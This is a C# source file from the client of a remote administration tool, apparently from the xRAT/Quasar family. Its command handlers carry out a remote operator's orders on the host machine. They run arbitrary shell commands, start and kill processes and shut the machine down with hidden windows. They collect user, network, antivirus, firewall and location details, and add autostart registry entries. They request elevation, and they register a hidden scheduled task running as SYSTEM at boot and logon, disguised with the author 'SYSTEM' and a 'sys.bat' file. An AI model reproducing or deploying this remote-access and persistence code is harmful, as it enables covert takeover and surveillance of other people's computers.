using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Core.Utilities.TaskScheduler;
using xClient.Enums;

using LegacyTS = xClient.Core.Utilities.TaskScheduler.Legacy;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE SYSTEM (drives, directories, files, etc.). */
    public static partial class CommandHandler
    {
        public static void HandleGetDrives(Packets.ServerPackets.GetDrives command, Client client)
        {
            DriveInfo[] drives;
            try
            {
                drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
            }
            catch (IOException)
            {
                new Packets.ClientPackets.SetStatusFileManager("GetDrives I/O error", false).Execute(client);
                return;
            }
            catch (UnauthorizedAccessException)
            {
                new Packets.ClientPackets.SetStatusFileManager("GetDrives No permission", false).Execute(client);
                return;
            }

            if (drives.Length == 0)
            {
                new Packets.ClientPackets.SetStatusFileManager("GetDrives No drives", false).Execute(client);
                return;
            }

            string[] displayName = new string[drives.Length];
            string[] rootDirectory = new string[drives.Length];
            for (int i = 0; i < drives.Length; i++)
            {
                string volumeLabel = null;
                try
                {
                    volumeLabel = drives[i].VolumeLabel;
                }
                catch
                {
                }

                if (string.IsNullOrEmpty(volumeLabel))
                {
                    displayName[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
                }
                else
                {
                    displayName[i] = string.Format("{0} ({1}) [{2}, {3}]", drives[i].RootDirectory.FullName, volumeLabel,
                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
                }
                rootDirectory[i] = drives[i].RootDirectory.FullName;
            }

            new Packets.ClientPackets.GetDrivesResponse(displayName, rootDirectory).Execute(client);
        }

        public static void HandleDoShutdownAction(Packets.ServerPackets.DoShutdownAction command, Client client)
        {
            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                switch (command.Action)
                {
                    case ShutdownAction.Shutdown:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Restart:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Standby:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Action failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleGetStartupItems(Packets.ServerPackets.GetStartupItems command, Client client)
        {
            try
            {
                List<string> startupItems = new List<string>();

                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "0" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "1" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "2" + formattedKeyValue));
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                    }
                }
                if (PlatformHelper.Is64Bit)
                {
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "4" + formattedKeyValue));
                        }
                    }
                    using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                    {
                        if (key != null)
                        {
                            startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "5" + formattedKeyValue));
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(from file in files where file.Name != "desktop.ini"
                                          select string.Format("{0}||{1}", file.Name, file.FullName) into formattedKeyValue
                                          select "6" + formattedKeyValue);
                }

                new Packets.ClientPackets.GetStartupItemsResponse(startupItems).Execute(client);
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Getting Autostart Items failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoStartupItemAdd(Packets.ServerPackets.DoStartupItemAdd command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 1:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 2:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 3:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 4:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 5:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case 6:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            command.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + command.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Adding Autostart Item failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleDoStartupItemRemove(Packets.ServerPackets.DoStartupItemRemove command, Client client)
        {
            try
            {
                switch (command.Type)
                {
                    case 0:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 1:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 2:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 3:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 4:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 5:
                        if (!PlatformHelper.Is64Bit)
                            throw new NotSupportedException("Only on 64-bit systems supported");

                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case 6:
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("File does not exist");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                new Packets.ClientPackets.SetStatus(string.Format("Removing Autostart Item failed: {0}", ex.Message)).Execute(client);
            }
        }

        public static void HandleGetSystemInfo(Packets.ServerPackets.GetSystemInfo command, Client client)
        {
            try
            {
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";


                string[] infoCollection = new string[]
                {
                    "Processor (CPU)",
                    DevicesHelper.GetCpuName(),
                    "Memory (RAM)",
                    string.Format("{0} MB", DevicesHelper.GetTotalRamAmount()),
                    "Video Card (GPU)",
                    DevicesHelper.GetGpuName(),
                    "Username",
                    WindowsAccountHelper.GetName(),
                    "PC Name",
                    SystemHelper.GetPcName(),
                    "Domain Name",
                    domainName,
                    "Host Name",
                    hostName,
                    "System Drive",
                    Path.GetPathRoot(Environment.SystemDirectory),
                    "System Directory",
                    Environment.SystemDirectory,
                    "Uptime",
                    SystemHelper.GetUptime(),
                    "MAC Address",
                    DevicesHelper.GetMacAddress(),
                    "LAN IP Address",
                    DevicesHelper.GetLanIp(),
                    "WAN IP Address",
                    GeoLocationHelper.GeoInfo.Ip,
                    "Antivirus",
                    SystemHelper.GetAntivirus(),
                    "Firewall",
                    SystemHelper.GetFirewall(),
                    "Time Zone",
                    GeoLocationHelper.GeoInfo.Timezone,
                    "Country",
                    GeoLocationHelper.GeoInfo.Country,
                    "ISP",
                    GeoLocationHelper.GeoInfo.Isp
                };

                new Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
            }
            catch
            {
            }
        }

        public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
        {
            Process[] pList = Process.GetProcesses();
            string[] processes = new string[pList.Length];
            int[] ids = new int[pList.Length];
            string[] titles = new string[pList.Length];

            int i = 0;
            foreach (Process p in pList)
            {
                processes[i] = p.ProcessName + ".exe";
                ids[i] = p.Id;
                titles[i] = p.MainWindowTitle;
                i++;
            }

            new Packets.ClientPackets.GetProcessesResponse(processes, ids, titles).Execute(client);
        }

        public static void HandleDoProcessStart(Packets.ServerPackets.DoProcessStart command, Client client)
        {
            if (string.IsNullOrEmpty(command.Processname))
            {
                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
                return;
            }

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    UseShellExecute = true,
                    FileName = command.Processname
                };
                Process.Start(startInfo);
            }
            catch
            {
                new Packets.ClientPackets.SetStatus("Process could not be started!").Execute(client);
            }
            finally
            {
                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
            }
        }

        public static void HandleDoProcessKill(Packets.ServerPackets.DoProcessKill command, Client client)
        {
            try
            {
                Process.GetProcessById(command.PID).Kill();
            }
            catch
            {
            }
            finally
            {
                HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
            }
        }

        public static void HandleDoAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
        {
            if (WindowsAccountHelper.GetAccountType() != "Admin")
            {
                ProcessStartInfo processStartInfo = new ProcessStartInfo
                {
                    FileName = "cmd",
                    Verb = "runas",
                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true
                };

                MutexHelper.CloseMutex();  // close the mutex so our new process will run
                try
                {
                    Process.Start(processStartInfo);
                }
                catch
                {
                    new Packets.ClientPackets.SetStatus("User refused the elevation request.").Execute(client);
                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                    return;
                }
                Program.ConnectClient.Exit();
            }
            else
            {
                new Packets.ClientPackets.SetStatus("Process already elevated.").Execute(client);
            }
        }
        
        public static void HandleDoShellExecute(Packets.ServerPackets.DoShellExecute command, Client client)
        {
            string input = command.Command;

            if (_shell == null && input == "exit") return;
            if (_shell == null) _shell = new Shell();

            if (input == "exit")
                CloseShell();
            else
                _shell.ExecuteCommand(input);
        }

        public static void CloseShell()
        {
            if (_shell != null)
                _shell.Dispose();
        }

        enum SID_NAME_USE
        {
            SidTypeUser = 1,
            SidTypeGroup,
            SidTypeDomain,
            SidTypeAlias,
            SidTypeWellKnownGroup,
            SidTypeDeletedAccount,
            SidTypeInvalid,
            SidTypeUnknown,
            SidTypeComputer
        }

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool LookupAccountSid(
           string lpSystemName,
           [MarshalAs(UnmanagedType.LPArray)] byte[] Sid,
           System.Text.StringBuilder lpName,
           ref uint cchName,
           System.Text.StringBuilder ReferencedDomainName,
           ref uint cchReferencedDomainName,
           out SID_NAME_USE peUse);

        public static void HandleCreateTask(Packets.ServerPackets.DoCreateTask command, Client client)
        {
            if (WindowsAccountHelper.GetAccountType() != "Admin")
            {
                new Packets.ClientPackets.SetStatus("Failed to create task: must be administrator.").Execute(client);
                return;
            }

            var name = new StringBuilder();
            var cchName = (uint)name.Capacity;
            var referencedDomainName = new StringBuilder();
            var cchReferencedDomainName = (uint)referencedDomainName.Capacity;
            SID_NAME_USE sidUse;

            var sid = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
            var sidBuff = new byte[sid.BinaryLength];
            sid.GetBinaryForm(sidBuff, 0);

            if (!LookupAccountSid(null, sidBuff, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
            {
                var err = Marshal.GetLastWin32Error();
                if (err == 122 /* ERROR_INSUFFICIENT_BUFFER */)
                {
                    name.EnsureCapacity((int)cchName);
                    referencedDomainName.EnsureCapacity((int)cchReferencedDomainName);
                    if (!LookupAccountSid(null, sidBuff, name, ref cchName, referencedDomainName, ref cchReferencedDomainName, out sidUse))
                    {
                        new Packets.ClientPackets.SetStatus(string.Format("Failed to create task with code: {0}.", Marshal.GetLastWin32Error())).Execute(client);
                        return;
                    }
                }
            }

            try
            {
                // If we're on Windows XP we need to use the Task Scheduler 1.0 interface
                if (PlatformHelper.XpOrHigher && !PlatformHelper.VistaOrHigher)
                {
                    var sched = new LegacyTS.CTaskScheduler() as LegacyTS.ITaskScheduler;

                    if (sched == null)
                    {
                        new Packets.ClientPackets.SetStatus("Failed to create task.").Execute(client);
                        return;
                    }

                    var taskGuid = Marshal.GenerateGuidForType(typeof(LegacyTS.ITask));
                    var cTaskGuid = Marshal.GenerateGuidForType(typeof(LegacyTS.CTask));
                    object taskObj;
                    sched.NewWorkItem(command.TaskName, ref cTaskGuid, ref taskGuid, out taskObj);
                    var task = (LegacyTS.ITask)taskObj;

                    task.SetApplicationName(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Tasks") + "\\sys.bat");
                    task.SetParameters(command.Arguments ?? "");
                    task.SetComment("");
                    task.SetCreator(name.ToString());
                    task.SetWorkingDirectory("");

                    var pwd = Marshal.StringToCoTaskMemUni(null);
                    task.SetAccountInformation("", pwd);
                    Marshal.FreeCoTaskMem(pwd);
                    task.SetIdleWait(10, 20);
                    task.SetMaxRunTime((uint)new TimeSpan(1, 0, 0).TotalMilliseconds);
                    task.SetPriority((uint)ProcessPriorityClass.High);

                    ushort triggerIdx;
                    LegacyTS.ITaskTrigger iTrigger;
                    task.CreateTrigger(out triggerIdx, out iTrigger);

                    // Boot trigger
                    var trigger = new LegacyTS.TaskTrigger();
                    iTrigger.GetTrigger(ref trigger);
                    trigger.Type = LegacyTS.TaskTriggerType.EVENT_TRIGGER_AT_SYSTEMSTART;
                    trigger.TriggerSize = (ushort)Marshal.SizeOf(trigger);
                    trigger.BeginYear = (ushort)DateTime.Today.Year;
                    trigger.BeginMonth = (ushort)DateTime.Today.Month;
                    trigger.BeginDay = (ushort)DateTime.Today.Day;
                    // Remove "Disabled" flag
                    trigger.Flags &= ~(uint)0x4 /* TASK_TRIGGER_FLAG.DISABLED */;

                    iTrigger.SetTrigger(ref trigger);
                    task.CreateTrigger(out triggerIdx, out iTrigger);

                    // Logon trigger
                    trigger = new LegacyTS.TaskTrigger();
                    iTrigger.GetTrigger(ref trigger);
                    trigger.Type = LegacyTS.TaskTriggerType.EVENT_TRIGGER_AT_LOGON;
                    trigger.TriggerSize = (ushort)Marshal.SizeOf(trigger);
                    trigger.BeginYear = (ushort)DateTime.Today.Year;
                    trigger.BeginMonth = (ushort)DateTime.Today.Month;
                    trigger.BeginDay = (ushort)DateTime.Today.Day;
                    // Remove "Disabled" flag
                    trigger.Flags &= ~(uint)0x4 /* TASK_TRIGGER_FLAG.DISABLED */;

                    iTrigger.SetTrigger(ref trigger);

                    var iFile = (IPersistFile)task;
                    iFile.Save(null, false);

                    // Create a small batch file to delay
                    File.WriteAllText(
                        Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Tasks") + "\\sys.bat",
                        string.Format("ping 127.0.0.1 -n 180 > nul{0}start\"{1}\"", Environment.NewLine, command.Path));
                }
                // Else we use Task Scheduler 2.0
                else if(PlatformHelper.VistaOrHigher)
                {
                    var sched = new TaskScheduler();
                    sched.Connect();

                    if (!sched.Connected)
                    {
                        new Packets.ClientPackets.SetStatus("Failed to create task.").Execute(client);
                        return;
                    }

                    var folder = sched.GetFolder("\\");
                    var task = sched.NewTask(0);
                    task.RegistrationInfo.Author = "SYSTEM";
                    task.Principal.RunLevel = TaskRunLevel.Highest;

                    task.Settings.StartWhenAvailable = true;
                    task.Settings.DisallowStartIfOnBatteries = false;
                    task.Settings.StopIfGoingOnBatteries = false;
                    task.Settings.ExecutionTimeLimit = "PT0S";
                    task.Settings.Hidden = true;

                    task.Principal.UserId = name.ToString();

                    task.Triggers.Create(TaskTriggerType.Logon);
                    var bootTrigger = (IBootTrigger)task.Triggers.Create(TaskTriggerType.Boot);
                    var execAction = (IExecAction)task.Actions.Create(TaskActionType.Execute);

                    bootTrigger.Id = "AnyLogon";
                    bootTrigger.Delay = "PT1M";
                    bootTrigger.Repetition.Interval = "PT1M";
                    bootTrigger.Repetition.Duration = "PT13M";
                    bootTrigger.Repetition.StopAtDurationEnd = true;

                    execAction.Path = command.Path;
                    execAction.Arguments = command.Arguments;

                    folder.RegisterTaskDefinition(command.TaskName, task, 6 /* TASK_CREATE_OR_UPDATE */, null, null,
                        TaskLogonType.InteractiveTokenOrPassword);
                }
            }
            catch
            {
                new Packets.ClientPackets.SetStatus(string.Format("Failed to create task with code: {0}.", Marshal.GetLastWin32Error())).Execute(client);
            }
            new Packets.ClientPackets.SetStatus("Created task.").Execute(client);
        }
    }
}
